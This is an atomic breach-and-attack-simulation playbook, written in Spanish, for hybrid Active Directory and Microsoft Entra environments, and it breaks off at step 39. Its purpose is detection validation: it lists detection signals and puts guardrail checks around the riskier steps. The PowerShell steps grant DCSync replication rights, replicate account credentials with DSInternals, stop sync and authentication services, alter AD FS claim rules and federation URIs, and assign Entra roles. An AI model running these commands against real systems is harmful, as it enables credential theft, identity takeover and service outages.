# Hybrid Active Directory to Microsoft Entra Compromise

| | |
|---|---|
| **Status** | active |
| **Severity** | critical |
| **Target environment** | Active Directory Domain Services + Microsoft Entra Connect y opcionalmente AD FS / Pass-through Authentication + Microsoft Entra ID |
| **MITRE Tactic** | TA0001 — Initial Access |
| **MITRE Technique** | T1078.002 — Domain Accounts |
| **Tags** | `active-directory` · `entra-id` · `hybrid-identity` · `entra-connect` · `adfs` · `pta` · `dcsync` · `federation` · `bas` · `atomic` |
| **Autor** | Sergio Javier Mazariego Guevara |
| **Creado** | 2026-07-20T22:49:18.051Z |
| **Actualizado** | 2026-07-20T22:49:18.051Z |

## Descripción

Escenario atómico para ambientes híbridos que modela reconocimiento de Active Directory, Entra Connect, AD FS y PTA; creación y sincronización de objetos canary; abuso controlado de replicación, federación y disponibilidad; pivot hacia Entra; persistencia cloud y contención.

## Steps

### 1. Validar identidad de dominio

**MITRE:** T1078.002

Confirmar el contexto de la cuenta de laboratorio usada en Active Directory.

```powershell
$ErrorActionPreference="Stop"
whoami /all
$env:USERDNSDOMAIN
```

**Resultado esperado:**

Se identifica usuario, grupos, privileges y dominio.

**Señales de detección:**

Windows Security 4624/4672, PowerShell logs y contexto del host de ejecución.

### 2. Descubrir dominio Active Directory

**MITRE:** T1482

Obtener identidad, DN, SID, modos funcionales y controladores del dominio.

```powershell
$ErrorActionPreference = "Stop"
Import-Module ActiveDirectory
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-hybrid-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null
Get-ADDomain -Server $env:STRIKE_AD_SERVER | ConvertTo-Json -Depth 5 | Set-Content (Join-Path $State "ad-domain.json"); Get-Content (Join-Path $State "ad-domain.json")
```

**Resultado esperado:**

Se obtiene información estructural del dominio autorizado.

**Señales de detección:**

PowerShell Script Block Logging, LDAP queries y eventos de administración.

### 3. Descubrir bosque Active Directory

**MITRE:** T1482

Obtener dominios, catálogo global, sitios y esquema del bosque.

```powershell
$ErrorActionPreference = "Stop"
Import-Module ActiveDirectory
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-hybrid-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null
Get-ADForest -Server $env:STRIKE_AD_SERVER | ConvertTo-Json -Depth 5 | Set-Content (Join-Path $State "ad-forest.json"); Get-Content (Join-Path $State "ad-forest.json")
```

**Resultado esperado:**

Se obtiene la topología del bosque.

**Señales de detección:**

LDAP/PowerShell discovery desde una identidad no administrativa habitual.

### 4. Enumerar trusts de dominio

**MITRE:** T1482

Enumerar relaciones de confianza y sus direcciones/tipos.

```powershell
$ErrorActionPreference = "Stop"
Import-Module ActiveDirectory
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-hybrid-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null
Get-ADTrust -Filter * -Server $env:STRIKE_AD_SERVER | Select Name,Direction,TrustType,ForestTransitive | ConvertTo-Json -Depth 4
```

**Resultado esperado:**

Se identifican trusts accesibles.

**Señales de detección:**

LDAP trust discovery, PowerShell logs y consultas a trustedDomain.

### 5. Enumerar controladores de dominio

**MITRE:** T1018

Enumerar DCs, sitios, OS y catálogo global.

```powershell
$ErrorActionPreference = "Stop"
Import-Module ActiveDirectory
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-hybrid-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null
Get-ADDomainController -Filter * -Server $env:STRIKE_AD_SERVER | Select HostName,Site,IPv4Address,OperatingSystem,IsGlobalCatalog | ConvertTo-Json
```

**Resultado esperado:**

Se obtienen controladores del dominio.

**Señales de detección:**

LDAP discovery y conexiones a DCs desde host BAS.

### 6. Enumerar Domain Admins

**MITRE:** T1069.002

Enumerar membresía recursiva de Domain Admins.

```powershell
$ErrorActionPreference = "Stop"
Import-Module ActiveDirectory
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-hybrid-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null
Get-ADGroupMember -Identity "Domain Admins" -Recursive -Server $env:STRIKE_AD_SERVER | Select Name,ObjectClass,DistinguishedName | ConvertTo-Json
```

**Resultado esperado:**

Se identifican miembros de Domain Admins.

**Señales de detección:**

LDAP group enumeration; queries sobre grupos privilegiados.

### 7. Enumerar Enterprise Admins

**MITRE:** T1069.002

Enumerar membresía recursiva de Enterprise Admins.

```powershell
$ErrorActionPreference = "Stop"
Import-Module ActiveDirectory
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-hybrid-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null
Get-ADGroupMember -Identity "Enterprise Admins" -Recursive -Server $env:STRIKE_AD_SERVER | Select Name,ObjectClass,DistinguishedName | ConvertTo-Json
```

**Resultado esperado:**

Se identifican miembros de Enterprise Admins.

**Señales de detección:**

LDAP group enumeration; queries sobre grupos privilegiados.

### 8. Enumerar cuentas con SPN

**MITRE:** T1087.002

Identificar usuarios y servicios con servicePrincipalName.

```powershell
$ErrorActionPreference = "Stop"
Import-Module ActiveDirectory
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-hybrid-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null
Get-ADUser -LDAPFilter "(servicePrincipalName=*)" -Properties servicePrincipalName -Server $env:STRIKE_AD_SERVER | Select SamAccountName,Enabled,ServicePrincipalName | ConvertTo-Json -Depth 5
```

**Resultado esperado:**

Se obtienen cuentas con SPNs.

**Señales de detección:**

LDAP filters sobre servicePrincipalName y volumen de queries.

### 9. Enumerar gMSA

**MITRE:** T1087.002

Enumerar group managed service accounts y principals autorizados.

```powershell
$ErrorActionPreference = "Stop"
Import-Module ActiveDirectory
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-hybrid-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null
Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword -Server $env:STRIKE_AD_SERVER | Select Name,Enabled,PrincipalsAllowedToRetrieveManagedPassword | ConvertTo-Json -Depth 6
```

**Resultado esperado:**

Se identifican gMSA visibles.

**Señales de detección:**

LDAP discovery sobre msDS-GroupManagedServiceAccount.

### 10. Enumerar usuarios del OU canary

**MITRE:** T1087.002

Enumerar exclusivamente objetos en el OU BAS autorizado.

```powershell
$ErrorActionPreference = "Stop"
Import-Module ActiveDirectory
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-hybrid-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null
Get-ADUser -Filter * -SearchBase $env:STRIKE_AD_CANARY_OU -Properties userPrincipalName,memberOf -Server $env:STRIKE_AD_SERVER | Select SamAccountName,UserPrincipalName,Enabled,DistinguishedName | ConvertTo-Json
```

**Resultado esperado:**

Se listan los usuarios canary.

**Señales de detección:**

LDAP queries con SearchBase sobre el OU BAS.

### 11. Consultar scheduler de Entra Connect

**MITRE:** T1526

Obtener estado del ciclo de sincronización, intervalos y staging mode.

```powershell
$ErrorActionPreference="Stop"
Invoke-Command -ComputerName $env:STRIKE_ADCONNECT_SERVER -ScriptBlock {
 Import-Module ADSync
 Get-ADSyncScheduler | ConvertTo-Json -Depth 5
}
```

**Resultado esperado:**

Se obtiene configuración del scheduler.

**Señales de detección:**

PowerShell remoting, ADSync cmdlets y logs de Entra Connect.

### 12. Enumerar conectores de Entra Connect

**MITRE:** T1526

Enumerar conectores AD y Entra configurados sin extraer credenciales.

```powershell
$ErrorActionPreference="Stop"
Invoke-Command -ComputerName $env:STRIKE_ADCONNECT_SERVER -ScriptBlock {
 Import-Module ADSync
 Get-ADSyncConnector | Select Name,ConnectorTypeName,Identifier | ConvertTo-Json
}
```

**Resultado esperado:**

Se identifican conectores y tipos.

**Señales de detección:**

PowerShell remoting y ADSync configuration access.

### 13. Enumerar reglas de sincronización

**MITRE:** T1526

Enumerar nombres, direcciones, precedencias y scopes de reglas AD Sync.

```powershell
$ErrorActionPreference="Stop"
Invoke-Command -ComputerName $env:STRIKE_ADCONNECT_SERVER -ScriptBlock {
 Import-Module ADSync
 Get-ADSyncRule | Select Name,Direction,Precedence,Disabled,ImmutableTag | ConvertTo-Json -Depth 5
}
```

**Resultado esperado:**

Se obtienen reglas de sincronización.

**Señales de detección:**

ADSync config access y PowerShell logs.

### 14. Consultar servicio Entra Connect Sync

**MITRE:** T1526

Consultar cuenta, estado y modo de inicio del servicio ADSync.

```powershell
$ErrorActionPreference="Stop"
Get-CimInstance -ComputerName $env:STRIKE_ADCONNECT_SERVER -ClassName Win32_Service -Filter "Name='ADSync'" |
 Select Name,State,StartMode,StartName | ConvertTo-Json
```

**Resultado esperado:**

Se obtiene el estado del servicio sin alterar la configuración.

**Señales de detección:**

Remote CIM/WMI query y Windows Service Control Manager.

### 15. Consultar tenant Entra conectado

**MITRE:** T1526

Consultar tenant Entra conectado mediante Microsoft Graph.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/organization?$select=id,displayName,verifiedDomains"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "hybrid-entra-org.json")
```

**Resultado esperado:**

Tenant Entra asociado.

**Señales de detección:**

Entra Graph activity, sign-in/audit context y principal de consulta.

### 16. Enumerar usuarios sincronizados en Entra

**MITRE:** T1087.004

Enumerar usuarios sincronizados en Entra mediante Microsoft Graph.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/users?$filter=onPremisesSyncEnabled%20eq%20true&$top=50&$select=id,userPrincipalName,onPremisesImmutableId,onPremisesSyncEnabled"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "hybrid-synced-users.json")
```

**Resultado esperado:**

Usuarios con sync on-premises habilitado.

**Señales de detección:**

Entra Graph activity, sign-in/audit context y principal de consulta.

### 17. Enumerar roles Entra de usuarios sincronizados

**MITRE:** T1069.003

Enumerar roles Entra de usuarios sincronizados mediante Microsoft Graph.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?$top=100"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "hybrid-cloud-role-assignments.json")
```

**Resultado esperado:**

Asignaciones de roles cloud visibles.

**Señales de detección:**

Entra Graph activity, sign-in/audit context y principal de consulta.

### 18. Enumerar dispositivos Entra

**MITRE:** T1087.004

Enumerar dispositivos Entra mediante Microsoft Graph.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/devices?$top=50&$select=id,displayName,trustType,profileType,onPremisesSyncEnabled"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "hybrid-cloud-devices.json")
```

**Resultado esperado:**

Dispositivos cloud y sincronizados visibles.

**Señales de detección:**

Entra Graph activity, sign-in/audit context y principal de consulta.

### 19. Consultar configuración de federación del dominio canary

**MITRE:** T1484.002

Obtener issuerUri, activeSignInUri, metadataExchangeUri y signing certificate de un dominio federado canary.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/domains/${STRIKE_ADFS_CANARY_DOMAIN}/federationConfiguration"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "hybrid-federation-config.json")
```

**Resultado esperado:**

Se obtiene la configuración federada existente.

**Señales de detección:**

Entra audit/Graph read sobre domain federation configuration.

### 20. Consultar propiedades de AD FS

**MITRE:** T1526

Obtener propiedades globales de AD FS relevantes para autenticación y auditoría.

```powershell
$ErrorActionPreference="Stop"
Invoke-Command -ComputerName $env:STRIKE_ADFS_SERVER -ScriptBlock {
 Import-Module ADFS
 Get-AdfsProperties | Select HostName,FederationPassiveAddress,EnableIdPInitiatedSignonPage,AuditLevel | ConvertTo-Json
}
```

**Resultado esperado:**

Se obtiene configuración de AD FS.

**Señales de detección:**

PowerShell remoting y AD FS admin logs.

### 21. Enumerar relying party trusts AD FS

**MITRE:** T1526

Enumerar relying party trusts y endpoints sin cambiar reglas.

```powershell
$ErrorActionPreference="Stop"
Invoke-Command -ComputerName $env:STRIKE_ADFS_SERVER -ScriptBlock {
 Import-Module ADFS
 Get-AdfsRelyingPartyTrust | Select Name,Enabled,Identifier,WSFedEndpoint | ConvertTo-Json -Depth 5
}
```

**Resultado esperado:**

Se obtienen relying party trusts visibles.

**Señales de detección:**

AD FS admin logs y PowerShell remoting.

### 22. Enumerar certificados AD FS

**MITRE:** T1526

Enumerar metadatos de certificados token-signing y token-decrypting sin exportar claves.

```powershell
$ErrorActionPreference="Stop"
Invoke-Command -ComputerName $env:STRIKE_ADFS_SERVER -ScriptBlock {
 Import-Module ADFS
 Get-AdfsCertificate | Select CertificateType,IsPrimary,Thumbprint,NotAfter | ConvertTo-Json
}
```

**Resultado esperado:**

Se obtienen thumbprints y expiración.

**Señales de detección:**

AD FS configuration discovery.

### 23. Consultar agente Pass-through Authentication

**MITRE:** T1526

Consultar estado del servicio del agente PTA BAS.

```powershell
$ErrorActionPreference="Stop"
Get-Service -ComputerName $env:STRIKE_PTA_SERVER -Name AzureADConnectAuthenticationAgent |
 Select MachineName,Name,Status,StartType | ConvertTo-Json
```

**Resultado esperado:**

Se obtiene estado del agente PTA.

**Señales de detección:**

Remote Service Control Manager access y agent operational logs.

### 24. Crear usuario de dominio canary en OU staging

**MITRE:** T1136.002

Crear un usuario BAS fuera del scope de sincronización para probar posteriormente el pivot híbrido.

```powershell
$ErrorActionPreference = "Stop"
Import-Module ActiveDirectory
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-hybrid-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Pwd=ConvertTo-SecureString ([guid]::NewGuid().ToString()+"aA1!") -AsPlainText -Force
New-ADUser -Name $env:STRIKE_AD_CANARY_USER -SamAccountName $env:STRIKE_AD_CANARY_USER -UserPrincipalName $env:STRIKE_AD_CANARY_UPN -Path $env:STRIKE_AD_STAGING_OU -AccountPassword $Pwd -Enabled $true -Description "STRIKE-BAS synthetic user" -Server $env:STRIKE_AD_SERVER
```

**Resultado esperado:**

El usuario aparece únicamente en el OU staging.

**Señales de detección:**

Windows Security 4720 y Directory Service changes; creator, target y OU.

### 25. Mover usuario canary al OU sincronizado

**MITRE:** T1556.007

Introducir el usuario BAS en el scope de Entra Connect moviéndolo al OU canary sincronizado.

```powershell
$ErrorActionPreference = "Stop"
Import-Module ActiveDirectory
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-hybrid-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$U=Get-ADUser -Identity $env:STRIKE_AD_CANARY_USER -Server $env:STRIKE_AD_SERVER
$U.DistinguishedName | Set-Content (Join-Path $State "hybrid-user-dn-before.txt")
Move-ADObject -Identity $U.DistinguishedName -TargetPath $env:STRIKE_AD_CANARY_OU -Server $env:STRIKE_AD_SERVER
```

**Resultado esperado:**

El usuario se encuentra dentro del OU sincronizado.

**Señales de detección:**

Directory Service change/move events y Entra Connect import/export logs.

### 26. Forzar ciclo delta de Entra Connect

**MITRE:** T1059.001

Solicitar un ciclo delta para materializar cambios canary en Entra.

```powershell
$ErrorActionPreference="Stop"
Invoke-Command -ComputerName $env:STRIKE_ADCONNECT_SERVER -ScriptBlock {
 Import-Module ADSync
 Start-ADSyncSyncCycle -PolicyType Delta
} | ConvertTo-Json
```

**Resultado esperado:**

Entra Connect acepta el ciclo delta.

**Señales de detección:**

PowerShell remoting, ADSync operational logs y export hacia Entra.

### 27. Verificar usuario canary sincronizado en Entra

**MITRE:** T1087.004

Buscar el UPN canary y confirmar onPremisesSyncEnabled.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/users/${STRIKE_CLOUD_USER_ID}?$select=id,userPrincipalName,onPremisesSyncEnabled,onPremisesImmutableId"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "hybrid-cloud-user.json")
```

**Resultado esperado:**

El usuario cloud refleja sincronización on-premises.

**Señales de detección:**

Graph read y Entra provisioning/audit logs.

### 28. Restablecer contraseña de usuario sincronizado canary

**MITRE:** T1098

Restablecer la contraseña del usuario AD canary para validar propagación y alertamiento.

```powershell
$ErrorActionPreference = "Stop"
Import-Module ActiveDirectory
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-hybrid-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Pwd=ConvertTo-SecureString ([guid]::NewGuid().ToString()+"aA1!") -AsPlainText -Force
Set-ADAccountPassword -Identity $env:STRIKE_AD_CANARY_USER -Reset -NewPassword $Pwd -Server $env:STRIKE_AD_SERVER
Set-ADUser -Identity $env:STRIKE_AD_CANARY_USER -ChangePasswordAtLogon $false -Server $env:STRIKE_AD_SERVER
```

**Resultado esperado:**

La contraseña del usuario canary cambia; no se imprime ni persiste.

**Señales de detección:**

Windows Security 4724; Entra Connect password hash sync logs; sign-in anomalies.

### 29. Agregar usuario canary a grupo sincronizado

**MITRE:** T1098

Agregar temporalmente el usuario BAS a un grupo AD sincronizado.

```powershell
$ErrorActionPreference = "Stop"
Import-Module ActiveDirectory
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-hybrid-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null
Add-ADGroupMember -Identity $env:STRIKE_AD_CANARY_GROUP -Members $env:STRIKE_AD_CANARY_USER -Server $env:STRIKE_AD_SERVER
```

**Resultado esperado:**

El usuario aparece como miembro del grupo canary.

**Señales de detección:**

Windows Security 4728/4732/4756 y Entra Connect group export.

### 30. Conceder derechos de replicación a operador BAS

**MITRE:** T1098

Conceder temporalmente los extended rights mínimos de replicación al operador canary.

```powershell
$ErrorActionPreference = "Stop"
Import-Module ActiveDirectory
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-hybrid-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

if ($env:STRIKE_ALLOW_DCSYNC -ne "true") { throw "Guardrail STRIKE_ALLOW_DCSYNC no habilitado" }
$DomainDN=(Get-ADDomain -Server $env:STRIKE_AD_SERVER).DistinguishedName
$Operator=$env:STRIKE_DCSYNC_OPERATOR
dsacls $DomainDN /G "$Operator`:CA;Replicating Directory Changes"
dsacls $DomainDN /G "$Operator`:CA;Replicating Directory Changes All"
```

**Resultado esperado:**

El operador BAS recibe derechos de replicación en el dominio canary.

**Señales de detección:**

Directory Service 5136/4662; cambios de ACL sobre el domain root y rights GUID de replicación.

### 31. Replicar credencial de una cuenta canary

**MITRE:** T1003.006

Usar DSInternals para replicar únicamente la cuenta BAS y registrar un hash de evidencia no reutilizable.

```powershell
$ErrorActionPreference="Stop"
if ($env:STRIKE_ALLOW_DCSYNC -ne "true") { throw "Guardrail STRIKE_ALLOW_DCSYNC no habilitado" }
Import-Module DSInternals
$Cred=Get-Credential -UserName $env:STRIKE_DCSYNC_OPERATOR -Message "Credencial del operador BAS"
$Account=Get-ADReplAccount -SamAccountName $env:STRIKE_AD_CANARY_USER -Domain $env:STRIKE_AD_DOMAIN -Server $env:STRIKE_AD_SERVER -Credential $Cred
$Evidence="$($Account.SamAccountName)|$($Account.NTHash)"
$Sha=[Convert]::ToHexString([Security.Cryptography.SHA256]::HashData([Text.Encoding]::UTF8.GetBytes($Evidence)))
@{samAccountName=$Account.SamAccountName;evidenceSha256=$Sha} | ConvertTo-Json
Remove-Variable Account,Evidence -ErrorAction SilentlyContinue
```

**Resultado esperado:**

Se confirma replicación de una sola cuenta sintética sin mostrar el NT hash.

**Señales de detección:**

Directory Service 4662 replication rights use; network access to DRSUAPI and DSInternals/PowerShell telemetry.

### 32. Exportar configuración de Entra Connect

**MITRE:** T1552.001

Exportar configuración declarativa de Entra Connect sin incluir secretos en texto plano.

```powershell
$ErrorActionPreference="Stop"
Invoke-Command -ComputerName $env:STRIKE_ADCONNECT_SERVER -ScriptBlock {
 param($Path)
 Import-Module ADSync
 Get-ADSyncServerConfiguration -Path $Path
} -ArgumentList "C:\Windows\Temp\STRIKE-BAS-ADSyncExport"
```

**Resultado esperado:**

Se genera un export de configuración BAS en ruta temporal.

**Señales de detección:**

PowerShell remoting, ADSync configuration export y file creation en servidor crítico.

### 33. Deshabilitar scheduler de Entra Connect

**MITRE:** T1685

Deshabilitar temporalmente el scheduler BAS y restaurar su estado.

```powershell
$ErrorActionPreference="Stop"
if ($env:STRIKE_ALLOW_SERVICE_INTERRUPTION -ne "true") { throw "Guardrail no habilitado" }
Invoke-Command -ComputerName $env:STRIKE_ADCONNECT_SERVER -ScriptBlock {
 Import-Module ADSync
 $Old=Get-ADSyncScheduler
 $Old.SyncCycleEnabled | Set-Content C:\Windows\Temp\STRIKE-BAS-SchedulerBefore.txt
 Set-ADSyncScheduler -SyncCycleEnabled $false
}
```

**Resultado esperado:**

SyncCycleEnabled queda false.

**Señales de detección:**

PowerShell remoting y Entra Connect admin/operational logs; scheduler state change.

### 34. Detener servicio ADSync canary

**MITRE:** T1489

Detener temporalmente el servicio de sincronización y volverlo a iniciar.

```powershell
$ErrorActionPreference="Stop"
if ($env:STRIKE_ALLOW_SERVICE_INTERRUPTION -ne "true") { throw "Guardrail no habilitado" }
Invoke-Command -ComputerName $env:STRIKE_ADCONNECT_SERVER -ScriptBlock { Stop-Service ADSync -Force }
```

**Resultado esperado:**

El servicio ADSync queda detenido durante la ventana BAS.

**Señales de detección:**

Windows System 7036, remote PowerShell y alertas de salud Entra Connect.

### 35. Modificar claim rule de relying party canary

**MITRE:** T1556.007

Agregar temporalmente una claim rule de marcador al relying party trust BAS.

```powershell
$ErrorActionPreference="Stop"
if ($env:STRIKE_ALLOW_FEDERATION_CHANGE -ne "true") { throw "Guardrail no habilitado" }
Invoke-Command -ComputerName $env:STRIKE_ADFS_SERVER -ScriptBlock {
 param($Rp)
 Import-Module ADFS
 $T=Get-AdfsRelyingPartyTrust -Name $Rp
 $T.IssuanceTransformRules | Set-Content C:\Windows\Temp\STRIKE-BAS-RulesBefore.txt
 $Rule='@RuleName = "STRIKE-BAS" c:[Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"] => issue(Type = "https://strike.local/bas", Value = "true");'
 Set-AdfsRelyingPartyTrust -TargetName $Rp -IssuanceTransformRules ($T.IssuanceTransformRules+"`r`n"+$Rule)
} -ArgumentList $env:STRIKE_ADFS_RP_NAME
```

**Resultado esperado:**

El relying party canary incluye la rule STRIKE-BAS.

**Señales de detección:**

AD FS Admin logs, PowerShell remoting y configuration change.

### 36. Habilitar IdP-initiated sign-on page

**MITRE:** T1556.007

Activar temporalmente la página IdP initiated en el farm BAS y restaurar su valor.

```powershell
$ErrorActionPreference="Stop"
if ($env:STRIKE_ALLOW_FEDERATION_CHANGE -ne "true") { throw "Guardrail no habilitado" }
Invoke-Command -ComputerName $env:STRIKE_ADFS_SERVER -ScriptBlock {
 Import-Module ADFS
 (Get-AdfsProperties).EnableIdPInitiatedSignonPage | Set-Content C:\Windows\Temp\STRIKE-BAS-IdPBefore.txt
 Set-AdfsProperties -EnableIdPInitiatedSignonPage $true
}
```

**Resultado esperado:**

La página IdP initiated queda habilitada.

**Señales de detección:**

AD FS Admin logs y configuration change; web access a idpinitiatedsignon.

### 37. Modificar URI de federación de dominio canary

**MITRE:** T1484.002

Modificar temporalmente passiveSignInUri de una configuración de federación canary y restaurarla.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

if ($env:STRIKE_ALLOW_FEDERATION_CHANGE -ne "true") { throw "Guardrail no habilitado" }
$F=Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/domains/$($env:STRIKE_ADFS_CANARY_DOMAIN)/federationConfiguration"
$Cfg=$F.value[0]
$Cfg | ConvertTo-Json -Depth 20 | Set-Content (Join-Path $State "hybrid-federation-before.json")
$Body=@{ passiveSignInUri=$env:STRIKE_ADFS_TEST_SIGNIN_URI } | ConvertTo-Json
Invoke-RestMethod -Method PATCH -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/domains/$($env:STRIKE_ADFS_CANARY_DOMAIN)/federationConfiguration/$($Cfg.id)" -Body $Body
```

**Resultado esperado:**

La configuración del dominio canary refleja la URI BAS.

**Señales de detección:**

Entra audit: Update domain federation configuration; actor, domain y modified properties.

### 38. Detener agente PTA dedicado BAS

**MITRE:** T1489

Detener temporalmente un agente PTA redundante o dedicado y restaurarlo.

```powershell
$ErrorActionPreference="Stop"
if ($env:STRIKE_ALLOW_SERVICE_INTERRUPTION -ne "true") { throw "Guardrail no habilitado" }
Stop-Service -InputObject (Get-Service -ComputerName $env:STRIKE_PTA_SERVER -Name AzureADConnectAuthenticationAgent) -Force
```

**Resultado esperado:**

El agente PTA BAS queda detenido.

**Señales de detección:**

Windows System 7036, Entra Connect Health alerts y agent telemetry.

### 39. Asignar rol Entra limitado a usuario sincronizado

**MITRE:** T1098.003

Asignar temporalmente un rol de directorio canary al usuario sincronizado.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Body = @{ principalId=$env:STRIKE_CLOUD_USER_ID; roleDefinitionId=$env:STRIKE_CLOUD_ROLE_ID; directoryScopeId="/" } | ConvertTo-Json -Depth 12
$Result = Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" -Body $Body
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "hybrid-cloud-role-created.json")
```

**Resultado esperado:**

Se crea una asignación de rol cloud para el usuario híbrido BAS.

**Señales de detección:**

